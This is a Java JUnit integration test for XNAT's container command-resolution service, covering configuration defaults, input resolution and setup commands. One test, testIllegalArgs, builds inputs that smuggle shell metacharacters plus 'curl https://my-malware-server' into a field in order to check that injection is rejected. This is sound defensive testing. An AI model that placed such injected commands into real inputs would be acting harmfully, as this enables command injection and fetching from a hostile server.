package org.nrg.containers;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.common.collect.Maps;
import com.google.common.collect.Sets;
import com.jayway.jsonpath.Configuration;
import com.jayway.jsonpath.Option;
import com.jayway.jsonpath.spi.json.JacksonJsonProvider;
import com.jayway.jsonpath.spi.json.JsonProvider;
import com.jayway.jsonpath.spi.mapper.JacksonMappingProvider;
import com.jayway.jsonpath.spi.mapper.MappingProvider;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.junit.runner.RunWith;
import org.mockito.Mockito;
import org.nrg.config.services.ConfigService;
import org.nrg.containers.config.IntegrationTestConfig;
import org.nrg.containers.exceptions.CommandResolutionException;
import org.nrg.containers.exceptions.IllegalInputException;
import org.nrg.containers.model.command.auto.Command;
import org.nrg.containers.model.command.auto.Command.CommandInput;
import org.nrg.containers.model.command.auto.Command.CommandWrapper;
import org.nrg.containers.model.command.auto.Command.CommandWrapperExternalInput;
import org.nrg.containers.model.command.auto.Command.ConfiguredCommand;
import org.nrg.containers.model.command.auto.ResolvedCommand;
import org.nrg.containers.model.command.auto.ResolvedCommandMount;
import org.nrg.containers.model.command.auto.ResolvedInputTreeNode;
import org.nrg.containers.model.command.auto.ResolvedInputValue;
import org.nrg.containers.model.command.entity.CommandType;
import org.nrg.containers.model.configuration.CommandConfiguration;
import org.nrg.containers.model.configuration.CommandConfiguration.CommandInputConfiguration;
import org.nrg.containers.model.configuration.CommandConfigurationInternal;
import org.nrg.containers.model.xnat.Project;
import org.nrg.containers.model.xnat.Resource;
import org.nrg.containers.model.xnat.Scan;
import org.nrg.containers.model.xnat.Session;
import org.nrg.containers.services.CommandResolutionService;
import org.nrg.containers.services.CommandService;
import org.nrg.containers.services.ContainerConfigService;
import org.nrg.containers.services.DockerService;
import org.nrg.containers.services.SetupCommandService;
import org.nrg.framework.constants.Scope;
import org.nrg.xdat.preferences.SiteConfigPreferences;
import org.nrg.xft.security.UserI;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.annotation.DirtiesContext;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.context.transaction.TestTransaction;
import org.springframework.transaction.annotation.Transactional;

import java.io.File;
import java.nio.file.Paths;
import java.util.Collections;
import java.util.Map;
import java.util.Set;

import static org.hamcrest.Matchers.hasEntry;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.instanceOf;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.isA;
import static org.hamcrest.Matchers.not;
import static org.hamcrest.Matchers.nullValue;
import static org.hamcrest.Matchers.startsWith;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.fail;
import static org.mockito.Mockito.when;

@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = IntegrationTestConfig.class)
@Transactional
public class CommandResolutionTest {
    private static final Logger log = LoggerFactory.getLogger(CommandResolutionTest.class);

    private UserI mockUser;
    private Command dummyCommand;
    private String resourceDir;
    private Map<String, CommandWrapper> xnatCommandWrappers;

    @Autowired private ObjectMapper mapper;
    @Autowired private CommandService commandService;
    @Autowired private CommandResolutionService commandResolutionService;
    @Autowired private ConfigService mockConfigService;
    @Autowired private SiteConfigPreferences mockSiteConfigPreferences;

    @Rule
    public TemporaryFolder folder = new TemporaryFolder(new File("/tmp"));

    @Before
    public void setup() throws Exception {
        Configuration.setDefaults(new Configuration.Defaults() {

            private final JsonProvider jsonProvider = new JacksonJsonProvider();
            private final MappingProvider mappingProvider = new JacksonMappingProvider();

            @Override
            public JsonProvider jsonProvider() {
                return jsonProvider;
            }

            @Override
            public MappingProvider mappingProvider() {
                return mappingProvider;
            }

            @Override
            public Set<Option> options() {
                return Sets.newHashSet(Option.DEFAULT_PATH_LEAF_TO_NULL);
            }
        });

        mockUser = Mockito.mock(UserI.class);
        when(mockUser.getLogin()).thenReturn("mockUser");

        resourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest").toURI()).toString().replace("%20", " ");
        final String commandJsonFile = resourceDir + "/command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        dummyCommand = commandService.create(tempCommand);

        xnatCommandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapperEntity : dummyCommand.xnatCommandWrappers()) {
            xnatCommandWrappers.put(commandWrapperEntity.name(), commandWrapperEntity);
        }

        when(mockSiteConfigPreferences.getBuildPath()).thenReturn(folder.getRoot().getAbsolutePath());
    }

    @Test
    @DirtiesContext
    public void testGetAndConfigure() throws Exception {

        final String commandInputName = "command-input";
        final String commandInputDefaultValue = "yucky";
        final String commandInputConfiguredDefaultValue = "yummy";
        final String commandWrapperExternalInputName = "wrapper-input";
        final String commandWrapperExternalInputDefaultValue = "blue";
        final String commandWrapperExternalInputConfiguredDefaultValue = "red";
        final Command command = commandService.create(Command.builder()
                .name("command")
                .image("whatever")
                .addInput(CommandInput.builder()
                        .name(commandInputName)
                        .defaultValue(commandInputDefaultValue)
                        .build())
                .addCommandWrapper(CommandWrapper.builder()
                        .name("wrapper")
                        .addExternalInput(CommandWrapperExternalInput.builder()
                                .name(commandWrapperExternalInputName)
                                .defaultValue(commandWrapperExternalInputDefaultValue)
                                .build())
                        .build())
                .build());

        TestTransaction.flagForCommit();
        TestTransaction.end();
        TestTransaction.start();

        final CommandConfiguration siteConfiguration = CommandConfiguration.builder()
                .addInput(commandInputName, CommandInputConfiguration.builder()
                        .defaultValue(commandInputConfiguredDefaultValue)
                        .build())
                .build();
        final CommandConfigurationInternal siteConfigurationInternal =
                CommandConfigurationInternal.create(true, siteConfiguration);
        final String siteConfigJson = mapper.writeValueAsString(siteConfigurationInternal);
        final org.nrg.config.entities.Configuration mockSiteConfig =
                Mockito.mock(org.nrg.config.entities.Configuration.class);
        when(mockSiteConfig.getContents()).thenReturn(siteConfigJson);

        final CommandConfigurationInternal projectConfigurationInternal =
                siteConfigurationInternal.merge(CommandConfigurationInternal.create(true, CommandConfiguration.builder()
                        .addInput(commandWrapperExternalInputName, CommandInputConfiguration.builder()
                                .defaultValue(commandWrapperExternalInputConfiguredDefaultValue)
                                .build())
                        .build()), true);
        final CommandConfiguration projectConfiguration = CommandConfiguration.create(
                command,
                command.xnatCommandWrappers().get(0),
                projectConfigurationInternal
        );
        final org.nrg.config.entities.Configuration mockProjectConfig =
                Mockito.mock(org.nrg.config.entities.Configuration.class);
        final String projectConfigJson = mapper.writeValueAsString(projectConfigurationInternal);
        when(mockProjectConfig.getContents()).thenReturn(projectConfigJson);

        final long wrapperId = command.xnatCommandWrappers().get(0).id();
        final String path = "wrapper-" + String.valueOf(wrapperId);
        final String project = "a-project";
        when(mockConfigService.getConfig(ContainerConfigService.TOOL_ID, path, Scope.Project, project))
                .thenReturn(mockProjectConfig);
        when(mockConfigService.getConfig(ContainerConfigService.TOOL_ID, path, Scope.Site, null))
                .thenReturn(mockSiteConfig);

        // Assert that the command is the command
        assertThat(commandService.get(command.id()), is(command));

        {
            // Assert that the site configuration changes the one default input value we set
            final ConfiguredCommand siteConfigCommand = siteConfiguration.apply(command);
            final CommandInput siteConfigCommandInput = siteConfigCommand.inputs().get(0);
            final CommandWrapperExternalInput siteConfigExternalInput = siteConfigCommand.wrapper().externalInputs().get(0);
            assertThat(siteConfigCommandInput.name(), is(commandInputName));
            assertThat(siteConfigCommandInput.defaultValue(), is(commandInputConfiguredDefaultValue)); // Default got changed
            assertThat(siteConfigExternalInput.name(), is(commandWrapperExternalInputName));
            assertThat(siteConfigExternalInput.defaultValue(), is(commandWrapperExternalInputDefaultValue)); // Default did not get changed

            // The service gives us the same command as doing the process manually
            assertThat(commandService.getAndConfigure(wrapperId), is(siteConfigCommand));
        }

        {
            // Assert that the project configuration changes both the default we set at the project level,
            // and the default we set at the site level.
            final ConfiguredCommand projectConfigCommand = projectConfiguration.apply(command);
            final CommandInput projectConfigCommandInput = projectConfigCommand.inputs().get(0);
            final CommandWrapperExternalInput siteConfigExternalInput = projectConfigCommand.wrapper().externalInputs().get(0);
            assertThat(projectConfigCommandInput.name(), is(commandInputName));
            assertThat(projectConfigCommandInput.defaultValue(), is(commandInputConfiguredDefaultValue)); // Default got changed
            assertThat(siteConfigExternalInput.name(), is(commandWrapperExternalInputName));
            assertThat(siteConfigExternalInput.defaultValue(), is(commandWrapperExternalInputConfiguredDefaultValue)); // Default got changed

            // The service gives us the same command as doing the process manually
            assertThat(commandService.getAndConfigure(project, wrapperId), is(projectConfigCommand));
        }
    }

    @Test
    public void testSessionScanResource() throws Exception {
        final String commandWrapperName = "session-scan-resource";
        final String inputPath = resourceDir + "/testSessionScanResource/session.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final String dicomDir = folder.newFolder("DICOM").getAbsolutePath();
        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Scan scan = session.getScans().get(0);
        scan.getResources().get(0).setDirectory(dicomDir);
        final String sessionRuntimeJson = mapper.writeValueAsString(session);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("session", sessionRuntimeJson);

        // xnat wrapper inputs
        final Map<String, String> expectedWrapperInputValues = Maps.newHashMap();
        expectedWrapperInputValues.put("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\"");
        expectedWrapperInputValues.put("session", session.getUri());
        expectedWrapperInputValues.put("scan", scan.getUri());
        expectedWrapperInputValues.put("dicom", scan.getResources().get(0).getUri());
        expectedWrapperInputValues.put("scan-id", scan.getId());
        expectedWrapperInputValues.put("frames", String.valueOf(scan.getFrames()));
        expectedWrapperInputValues.put("series-description", scan.getSeriesDescription());
        expectedWrapperInputValues.put("modality", scan.getModality());
        expectedWrapperInputValues.put("quality", scan.getQuality());
        expectedWrapperInputValues.put("note", scan.getNote());

        // command inputs
        final Map<String, String> expectedCommandInputValues = Maps.newHashMap();
        expectedCommandInputValues.put("whatever", session.getScans().get(0).getId());
        expectedCommandInputValues.put("file-path", "null");

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testResourceFile() throws Exception {
        final String commandWrapperName = "scan-resource-file";
        final String inputPath = resourceDir + "/testResourceFile/scan.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final String resourceDir = folder.newFolder("resource").getAbsolutePath();
        final Scan scan = mapper.readValue(new File(inputPath), Scan.class);
        final Resource resource = scan.getResources().get(0);
        resource.setDirectory(resourceDir);
        resource.getFiles().get(0).setPath(resourceDir + "/" + resource.getFiles().get(0).getName());
        final String scanRuntimeJson = mapper.writeValueAsString(scan);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("a scan", scanRuntimeJson);

        // xnat wrapper inputs
        final Map<String, String> expectedWrapperInputValues = Maps.newHashMap();
        expectedWrapperInputValues.put("a scan", scan.getUri());
        expectedWrapperInputValues.put("a resource", resource.getUri());
        expectedWrapperInputValues.put("a file", resource.getFiles().get(0).getUri());
        expectedWrapperInputValues.put("a file path", resource.getFiles().get(0).getPath());
        expectedWrapperInputValues.put("scan-id", scan.getId());

        // command inputs
        final Map<String, String> expectedCommandInputValues = Maps.newHashMap();
        expectedCommandInputValues.put("file-path", resource.getFiles().get(0).getPath());
        expectedCommandInputValues.put("whatever", scan.getId());

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testProject() throws Exception {
        final String commandWrapperName = "project";
        final String inputPath = resourceDir + "/testProject/project.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final Project project = mapper.readValue(new File(inputPath), Project.class);
        final String projectRuntimeJson = mapper.writeValueAsString(project);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("project", projectRuntimeJson);

        // xnat wrapper inputs
        final Map<String, String> expectedWrapperInputValues = Maps.newHashMap();
        expectedWrapperInputValues.put("project", project.getUri());
        expectedWrapperInputValues.put("project-label", project.getLabel());

        // command inputs
        final Map<String, String> expectedCommandInputValues = Maps.newHashMap();
        expectedCommandInputValues.put("whatever", project.getLabel());
        expectedCommandInputValues.put("file-path", "null");

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testProjectSubject() throws Exception {
        final String commandWrapperName = "project-subject";
        final String inputPath = resourceDir + "/testProjectSubject/project.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final Project project = mapper.readValue(new File(inputPath), Project.class);
        final String projectRuntimeJson = mapper.writeValueAsString(project);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("project", projectRuntimeJson);

        // xnat wrapper inputs
        final Map<String, String> expectedWrapperInputValues = Maps.newHashMap();
        expectedWrapperInputValues.put("project", project.getUri());
        expectedWrapperInputValues.put("subject", project.getSubjects().get(0).getUri());
        expectedWrapperInputValues.put("project-label", project.getLabel());

        // command inputs
        final Map<String, String> expectedCommandInputValues = Maps.newHashMap();
        expectedCommandInputValues.put("whatever", project.getLabel());
        expectedCommandInputValues.put("file-path", "null");

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testSessionAssessor() throws Exception {
        final String commandWrapperName = "session-assessor";
        final String inputPath = resourceDir + "/testSessionAssessor/session.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final String sessionRuntimeJson = mapper.writeValueAsString(session);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("session", sessionRuntimeJson);

        final Map<String, String> expectedWrapperInputValues = Maps.newHashMap();
        expectedWrapperInputValues.put("session", session.getUri());
        expectedWrapperInputValues.put("assessor", session.getAssessors().get(0).getUri());
        expectedWrapperInputValues.put("assessor-label", session.getAssessors().get(0).getLabel());

        final Map<String, String> expectedCommandInputValues = Maps.newHashMap();
        expectedCommandInputValues.put("whatever", session.getAssessors().get(0).getLabel());
        expectedCommandInputValues.put("file-path", "null");

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    // TODO Re-do this test when I figure out how config inputs should work & should be resolved
    // @Test
    // public void testConfig() throws Exception {
    //     final String siteConfigName = "site-config";
    //     final String siteConfigInput = "{" +
    //             "\"name\": \"" + siteConfigName + "\", " +
    //             "\"type\": \"Config\", " +
    //             "\"required\": true" +
    //             "}";
    //     final String projectInputName = "project";
    //     final String projectInput = "{" +
    //             "\"name\": \"" + projectInputName + "\", " +
    //             "\"description\": \"This input accepts a project\", " +
    //             "\"type\": \"Project\", " +
    //             "\"required\": true" +
    //             "}";
    //     final String projectConfigName = "project-config";
    //     final String projectConfigInput = "{" +
    //             "\"name\": \"" + projectConfigName + "\", " +
    //             "\"type\": \"Config\", " +
    //             "\"required\": true," +
    //             "\"parent\": \"" + projectInputName + "\"" +
    //             "}";
    //
    //     final String commandLine = "echo hello world";
    //     final String commandJson = "{" +
    //             "\"name\": \"command\", " +
    //             "\"description\": \"Testing config inputs\"," +
    //             "\"docker-image\": \"" + BUSYBOX_LATEST + "\"," +
    //             "\"run\": {" +
    //                 "\"command-line\": \"" + commandLine + "\"" +
    //             "}," +
    //             "\"inputs\": [" +
    //                 projectInput + ", " +
    //                 siteConfigInput + ", " +
    //                 projectConfigInput + //", " +
    //             "]" +
    //             "}";
    //     final Command command = mapper.readValue(commandJson, Command.class);
    //     commandService.create(command);
    //
    //     final String toolname = "toolname";
    //     final String siteConfigFilename = "site-config-filename";
    //     final String siteConfigContents = "Hey, I am stored in a site config!";
    //     when(mockConfigService.getConfigContents(toolname, siteConfigFilename, Scope.Site, null))
    //             .thenReturn(siteConfigContents);
    //
    //     final String projectId = "theProject";
    //     final String projectConfigFilename = "project-config-filename";
    //     final String projectConfigContents = "Hey, I am stored in a project config!";
    //     when(mockConfigService.getConfigContents(toolname, projectConfigFilename, Scope.Project, projectId))
    //             .thenReturn(projectConfigContents);
    //
    //     final String projectUri = "/projects/" + projectId;
    //     final String projectRuntimeJson = "{" +
    //             "\"id\": \"" + projectId + "\", " +
    //             "\"label\": \"" + projectId + "\", " +
    //             "\"uri\": \"" + projectUri + "\", " +
    //             "\"type\": \"Project\"" +
    //             "}";
    //
    //     final Map<String, String> runtimeValues = Maps.newHashMap();
    //     runtimeValues.put(siteConfigName, toolname + "/" + siteConfigFilename);
    //     runtimeValues.put(projectConfigName, toolname + "/" + projectConfigFilename);
    //     runtimeValues.put(projectInputName, projectRuntimeJson);
    //
    //     final ResolvedCommand resolvedCommand = commandService.resolveCommand(command, runtimeValues, mockUser);
    //     assertThat(resolvedCommand.getCommandId(), is(command.getId()));
    //     assertThat(resolvedCommand.getImage(), is(command.getImage()));
    //     assertThat(resolvedCommand.getCommandLine(), is(commandLine));
    //     assertThat(resolvedCommand.getEnvironmentVariables().isEmpty(), is(true));
    //     assertThat(resolvedCommand.getMountsIn().isEmpty(), is(true));
    //     assertThat(resolvedCommand.getMountsOut().isEmpty(), is(true));
    //     assertThat(resolvedCommand.getOutputs().isEmpty(), is(true));
    //     assertThat(resolvedCommand, instanceOf(ResolvedDockerCommand.class));
    //     assertThat(((ResolvedDockerCommand) resolvedCommand).getPorts().isEmpty(), is(true));
    //
    //     final Map<String, String> inputValues = resolvedCommand.getCommandInputValues();
    //     assertThat(inputValues, hasEntry(siteConfigName, siteConfigContents));
    //     assertThat(inputValues, hasEntry(projectConfigName, projectConfigContents));
    //     assertThat(inputValues, hasEntry(projectInputName, projectUri));
    // }

    private void assertStuffAboutResolvedCommand(final ResolvedCommand resolvedCommand,
                                                 final Command dummyCommand,
                                                 final CommandWrapper commandWrapper,
                                                 final Map<String, String> expectedRawInputValues,
                                                 final Map<String, String> expectedWrapperInputValues,
                                                 final Map<String, String> expectedCommandInputValues) {
        assertThat(resolvedCommand.commandId(), is(dummyCommand.id()));
        assertThat(resolvedCommand.wrapperId(), is(commandWrapper.id()));
        assertThat(resolvedCommand.image(), is(dummyCommand.image()));
        assertThat(resolvedCommand.commandLine(), is(dummyCommand.commandLine()));
        assertThat(resolvedCommand.environmentVariables().isEmpty(), is(true));
        assertThat(resolvedCommand.mounts().isEmpty(), is(true));
        assertThat(resolvedCommand.type(), is(CommandType.DOCKER.getName()));
        assertThat(resolvedCommand.ports().isEmpty(), is(true));

        // Inputs
        assertThat(resolvedCommand.rawInputValues(), is(expectedRawInputValues));
        assertThat(resolvedCommand.wrapperInputValues(), is(expectedWrapperInputValues));
        assertThat(resolvedCommand.commandInputValues(), is(expectedCommandInputValues));

        // Outputs
        assertThat(resolvedCommand.outputs().isEmpty(), is(true));
    }

    @Test
    public void testRequiredParamNotBlank() throws Exception {
        final String commandJsonFile = resourceDir + "/params-command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        final Command command = commandService.create(tempCommand);

        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
            commandWrappers.put(commandWrapper.name(), commandWrapper);
        }

        final CommandWrapper blankWrapper = commandWrappers.get("blank-wrapper");
        final Map<String, String> filledRuntimeValues = Maps.newHashMap();
        filledRuntimeValues.put("REQUIRED_WITH_FLAG", "foo");
        filledRuntimeValues.put("REQUIRED_NO_FLAG", "bar");

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(blankWrapper.id(), filledRuntimeValues, mockUser);
        assertThat(resolvedCommand.commandInputValues(), hasEntry("REQUIRED_WITH_FLAG", "foo"));
        assertThat(resolvedCommand.commandInputValues(), hasEntry("REQUIRED_NO_FLAG", "bar"));
        assertThat(resolvedCommand.commandInputValues(), hasEntry("NOT_REQUIRED", "null"));
        assertThat(resolvedCommand.commandLine(), is("echo bar --flag foo "));


        try {
            final Map<String, String> blankRuntimeValues = Maps.newHashMap();  // Empty map
            commandResolutionService.resolve(blankWrapper.id(), blankRuntimeValues, mockUser);
            fail("Command resolution should have failed with missing required parameters.");
        } catch (CommandResolutionException e) {
            assertThat(e.getMessage(), is("Missing values for required inputs: REQUIRED_NO_FLAG, REQUIRED_WITH_FLAG."));
        }
    }

    @Test
    public void testIllegalArgs() throws Exception {
        final String commandJsonFile = resourceDir + "/illegal-args-command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        final Command command = commandService.create(tempCommand);

        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
            commandWrappers.put(commandWrapper.name(), commandWrapper);
        }

        final CommandWrapper identityWrapper = commandWrappers.get("identity-wrapper");
        final String inputName = "anything";

        for (final String illegalString : CommandResolutionService.ILLEGAL_INPUT_STRINGS) {
            final Map<String, String> runtimeValues = Maps.newHashMap();

            // Ignore the fact that these aren't all valid shell commands. We are only checking for the presence of the substrings.
            runtimeValues.put(inputName, "foo " + illegalString + " curl https://my-malware-server");

            try {
                final ResolvedCommand resolvedCommand = commandResolutionService.resolve(identityWrapper.id(), runtimeValues, mockUser);
                fail("Command resolution should have failed because of the illegal string.");
            } catch (IllegalInputException e) {
                assertThat(e.getMessage(), is(String.format("Input \"%s\" has a value containing illegal string \"%s\".",
                        inputName, illegalString)));
            }
        }
    }

    @Test
    public void testSerializeResolvedCommand() throws Exception {
        final Command.CommandWrapperExternalInput externalInput = CommandWrapperExternalInput.builder()
                .name("externalInput")
                .id(0L)
                .type("string")
                .build();
        final ResolvedInputValue externalInputValue = ResolvedInputValue.builder()
                .type("string")
                .value("externalInputValue")
                .build();
        final Command.CommandWrapperDerivedInput derivedInput = Command.CommandWrapperDerivedInput.builder()
                .name("derivedInput")
                .id(0L)
                .type("string")
                .build();
        final ResolvedInputValue derivedInputValue = ResolvedInputValue.builder()
                .type("string")
                .value("derivedInputValue")
                .build();
        final ResolvedInputTreeNode<CommandWrapperExternalInput> inputTree = ResolvedInputTreeNode.create(
                externalInput,
                Collections.singletonList(
                        ResolvedInputTreeNode.ResolvedInputTreeValueAndChildren.create(
                                externalInputValue,
                                Collections.<ResolvedInputTreeNode<? extends Command.Input>>singletonList(
                                        ResolvedInputTreeNode.create(
                                                derivedInput,
                                                Collections.singletonList(ResolvedInputTreeNode.ResolvedInputTreeValueAndChildren.create(derivedInputValue))
                                        )
                                )
                        )
                )
        );

        final ResolvedCommand resolvedCommand = ResolvedCommand.builder()
                .commandId(0L)
                .commandName("command")
                .commandDescription("command description")
                .wrapperId(0L)
                .wrapperName("wrapper")
                .wrapperDescription("wrapper description")
                .addEnvironmentVariable("name", "value")
                .addPort("1", "2")
                .addRawInputValue("input name", "input value")
                .addResolvedInputTree(inputTree)
                .image("image")
                .commandLine("script.sh")
                .addMount(ResolvedCommandMount.builder()
                        .name("mount")
                        .containerPath("/path")
                        .writable(true)
                        .xnatHostPath("/xnat/path")
                        .containerHostPath("/container/path")
                        .fromWrapperInput("derivedInput")
                        .build())
                .build();

        final String resolvedCommandJson = mapper.writeValueAsString(resolvedCommand);
    }

    @Test
    @DirtiesContext
    public void testResolveCommandWithSetupCommand() throws Exception {
        final String setupCommandResourceDir = Paths.get(ClassLoader.getSystemResource("setupCommand").toURI()).toString().replace("%20", " ");

        final String setupCommandJson = setupCommandResourceDir + "/setup-command.json";
        final Command setupCommandToCreate = mapper.readValue(new File(setupCommandJson), Command.class);
        final Command setupCommand = commandService.create(setupCommandToCreate);

        final String commandWithSetupCommandJson = setupCommandResourceDir + "/command-with-setup-command.json";
        final Command commandWithSetupCommand = mapper.readValue(new File(commandWithSetupCommandJson), Command.class);
        final Command commandWithSetupCommandCreated = commandService.create(commandWithSetupCommand);
        final CommandWrapper commandWrapper = commandWithSetupCommandCreated.xnatCommandWrappers().get(0);

        final String resourceInputJsonPath = setupCommandResourceDir + "/resource.json";
        // I need to set the resource directory to a temp directory
        final String resourceDir = folder.newFolder("resource").getAbsolutePath();
        final Resource resourceInput = mapper.readValue(new File(resourceInputJsonPath), Resource.class);
        resourceInput.setDirectory(resourceDir);
        final String resourceInputJson = mapper.writeValueAsString(resourceInput);

        final Map<String, String> runtimeValues = Collections.singletonMap("resource", resourceInputJson);
        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);

        assertThat(resolvedCommand.mounts(), hasSize(1));
        final ResolvedCommandMount resolvedCommandMount = resolvedCommand.mounts().get(0);
        assertThat(resolvedCommandMount.viaSetupCommand(), is("xnat/test-setup-command:latest:setup-command"));

        final String resolvedCommandMountPath = resolvedCommandMount.xnatHostPath();
        assertThat(resolvedCommandMountPath, is(resolvedCommandMount.containerHostPath()));
        assertThat(resolvedCommandMountPath, startsWith(folder.getRoot().getAbsolutePath()));

        assertThat(resolvedCommand.setupCommands(), hasSize(1));
        final ResolvedCommand resolvedSetupCommand = resolvedCommand.setupCommands().get(0);
        assertThat(resolvedSetupCommand.commandId(), is(setupCommand.id()));
        assertThat(resolvedSetupCommand.commandName(), is(setupCommand.name()));
        assertThat(resolvedSetupCommand.image(), is(setupCommand.image()));
        assertThat(resolvedSetupCommand.wrapperId(), is(0L));
        assertThat(resolvedSetupCommand.wrapperName(), is(""));
        assertThat(resolvedSetupCommand.commandLine(), is(setupCommand.commandLine()));
        assertThat(resolvedSetupCommand.workingDirectory(), is(setupCommand.workingDirectory()));

        assertThat(resolvedSetupCommand.mounts(), hasSize(2));
        for (final ResolvedCommandMount setupMount : resolvedSetupCommand.mounts()) {
            assertThat(setupMount.viaSetupCommand(), is(nullValue()));
            assertThat(setupMount.xnatHostPath(), is(setupMount.containerHostPath()));
            if (setupMount.name().equals("input")) {
                assertThat(setupMount.writable(), is(false));
                assertThat(setupMount.containerPath(), is("/input"));
                assertThat(setupMount.xnatHostPath(), is(resourceDir));
            } else if (setupMount.name().equals("output")) {
                assertThat(setupMount.containerPath(), is("/output"));
                assertThat(setupMount.writable(), is(true));
                assertThat(setupMount.xnatHostPath(), is(resolvedCommandMountPath));
            } else {
                fail("The only mounts on the resolved setup command should be named \"input\" and \"output\".");
            }
        }

    }
}
